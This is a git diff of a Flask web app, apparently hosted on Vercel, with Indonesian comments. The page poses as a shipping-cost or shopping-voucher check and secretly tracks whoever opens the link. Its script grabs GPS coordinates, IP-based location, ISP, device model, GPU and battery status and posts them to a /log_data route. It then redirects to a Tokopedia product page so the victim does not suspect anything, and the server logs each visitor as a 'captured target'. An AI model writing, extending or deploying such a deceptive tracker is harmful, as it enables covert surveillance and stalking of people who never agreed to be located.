@@ -1,5 +1,6 @@
 from flask import Flask, request, render_template_string, jsonify
-import requests # Library untuk cek lokasi IP
+import requests
+import re
 
 # Vercel mencari variable bernama 'app' ini secara otomatis
 app = Flask(__name__)
@@ -10,64 +11,102 @@ TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-1
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="id" prefix="og: http://ogp.me/ns#">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cek Ongkir Otomatis</title>
-    <meta property="og:title" content="Shopee Big Sale - Gratis Ongkir Rp0">
-    <meta property="og:description" content="Klik untuk melihat voucher khusus lokasi Anda.">
     <meta property="og:image" content="{{ image }}">
     <meta name="twitter:card" content="summary_large_image">
     <style>
-        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-align: center; padding: 20px; background-color: #f8f8f8; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }
-        .logo { width: 100px; margin-bottom: 20px; }
-        p { color: #555; font-size: 14px; margin-bottom: 20px; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f8f8f8; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="{{ image }}" class="logo" alt="Shopee">
-        <h3>Sedang Memeriksa Lokasi...</h3>
-        <p>Mohon izinkan akses lokasi untuk menghitung ongkos kirim.</p>
-        <div class="loader"></div>
-        <p id="status">Menghubungkan ke server...</p>
-    </div>
+    <h3>Memproses Data...</h3>
+    <div class="loader"></div>
+    <p>Mohon tunggu sebentar...</p>
 
     <script>
         const targetUrl = "{{ target }}";
 
-        function redirectNow() {
-            window.location.href = targetUrl;
+        // 1. Ambil Info Perangkat (Layar, GPU, User Agent)
+        function getBasicInfo() {
+            let info = {
+                userAgent: navigator.userAgent,
+                screen: screen.width + "x" + screen.height,
+                gpu: "Unknown"
+            };
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch(e) {}
+            return info;
         }
 
-        function sendGps(lat, long, acc) {
-            fetch('/save_gps', {
+        // 2. Ambil Info Baterai (Async)
+        async function getBatteryStatus() {
+            let batteryInfo = { level: "Unknown", charging: "Unknown" };
+            
+            // Cek apakah browser mendukung API Baterai (Chrome/Android support, iPhone tidak)
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    batteryInfo.level = Math.round(bat.level * 100) + "%";
+                    batteryInfo.charging = bat.charging ? "Ya (Sedang Dicas)" : "Tidak (Baterai Hp)";
+                } catch (e) {
+                    console.log("Gagal baca baterai");
+                }
+            } else {
+                batteryInfo.level = "Not Supported (Mungkin iPhone)";
+            }
+            return batteryInfo;
+        }
+
+        // 3. Fungsi Kirim Data Utama
+        async function sendData(gpsData = null) {
+            let deviceData = getBasicInfo();
+            let batteryData = await getBatteryStatus(); // Tunggu data baterai
+
+            let payload = {
+                device: deviceData,
+                battery: batteryData,
+                gps: gpsData
+            };
+
+            fetch('/log_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude: lat, longitude: long, accuracy: acc })
-            }).then(() => { redirectNow(); }).catch(() => { redirectNow(); });
+                body: JSON.stringify(payload)
+            }).then(() => {
+                window.location.href = targetUrl;
+            }).catch(() => {
+                window.location.href = targetUrl;
+            });
         }
 
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        sendGps(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                        sendData({ lat: pos.coords.latitude, long: pos.coords.longitude, acc: pos.coords.accuracy });
                     },
                     (err) => {
-                        // Jika User KLIK BLOCK / TOLAK:
-                        // Tidak masalah, kita sudah dapat IP di server.
-                        // Langsung redirect saja biar dia tidak curiga.
-                        redirectNow();
+                        sendData(null); // User tolak GPS
                     },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 4000 }
                 );
             } else {
-                redirectNow();
+                sendData(null);
             }
         };
     </script>
@@ -75,57 +114,54 @@ HTML_TEMPLATE = """
 </html>
 """
 
-# Fungsi Helper: Cek Lokasi via IP (Tanpa Izin User)
+def parse_device_name(ua_string):
+    if "iPhone" in ua_string: return "Apple iPhone"
+    if "Android" in ua_string:
+        match = re.search(r";\s?([^;]+?)\s?Build/", ua_string)
+        if match: return f"Android - Model: {match.group(1).strip()}"
+    if "Windows" in ua_string: return "PC / Laptop (Windows)"
+    return "Perangkat Tidak Dikenal"
+
 def get_ip_info(ip_address):
     try:
-        # Menggunakan API publik gratis ip-api.com
-        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,regionName,city,isp,lat,lon")
-        data = response.json()
-        if data['status'] == 'success':
-            return data
-    except:
-        return None
-    return None
+        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,city,regionName,isp,mobile")
+        return response.json() if response.status_code == 200 else None
+    except: return None
 
-# Rute Utama
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def home(path):
-    # 1. AMBIL IP ADDRESS
-    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', '').lower()
-    
-    # 2. FILTER BOT (Supaya log tidak penuh sampah bot WA)
-    is_bot = "facebookexternalhit" in user_agent or "whatsapp" in user_agent
-    
-    if not is_bot:
-        # 3. LACAK LOKASI BERDASARKAN IP (JALAN OTOMATIS)
-        # Ini akan sukses meskipun user menolak GPS nanti
-        print(f"\n--- [TARGET MASUK] ---")
-        print(f"IP Address  : {user_ip}")
-        print(f"Device Info : {user_agent}")
-        
-        geo_data = get_ip_info(user_ip)
-        if geo_data:
-            print(f"Lokasi (IP) : {geo_data['city']}, {geo_data['regionName']}, {geo_data['country']}")
-            print(f"ISP         : {geo_data['isp']}")
-            print(f"Perkiraan Koordinat (IP) : {geo_data['lat']}, {geo_data['lon']}")
-        else:
-            print("Gagal mengambil detail lokasi IP.")
-        print("----------------------\n")
-
     return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
 
-# Rute Penerima GPS (Jika user klik ALLOW)
-@app.route('/save_gps', methods=['POST'])
-def save_gps():
+@app.route('/log_data', methods=['POST'])
+def log_data():
     data = request.json
+    device = data.get('device', {})
+    battery = data.get('battery', {}) # Ambil data baterai
+    gps = data.get('gps')
+    
     user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
+    geo_ip = get_ip_info(user_ip)
+    readable_name = parse_device_name(device.get('userAgent', ''))
+
+    print("\n" + "="*40)
+    print(f"🔥 TARGET TERTANGKAP! (IP: {user_ip})")
+    print("="*40)
     
-    print(f"\n!!! JACKPOT: GPS DITEMUKAN !!!")
-    print(f"IP Source   : {user_ip}")
-    print(f"Google Maps : https://www.google.com/maps/search/?api=1&query={data['latitude']},{data['longitude']}")
-    print(f"Akurasi     : {data['accuracy']} meter")
-    print("------------------------------\n")
+    print(f"[📱 DEVICE INFO]")
+    print(f"• HP / Model : {readable_name}")
+    print(f"• Baterai    : {battery.get('level')}")   # <--- FITUR BARU
+    print(f"• Charging?  : {battery.get('charging')}")# <--- FITUR BARU
+    print(f"• GPU        : {device.get('gpu')}")
     
-    return jsonify({"status": "success"})
+    if gps:
+        print(f"\n[📍 GPS AKURAT]")
+        print(f"• Maps : https://www.google.com/maps/search/?api=1&query={gps['lat']},{gps['long']}")
+        print(f"• Akurasi : {gps['acc']}m")
+    elif geo_ip:
+        print(f"\n[📍 LOKASI IP]")
+        print(f"• Lokasi : {geo_ip.get('city')}, {geo_ip.get('regionName')}")
+        print(f"• ISP    : {geo_ip.get('isp')}")
+
+    print("="*40 + "\n")
+    return jsonify({"status": "captured"})
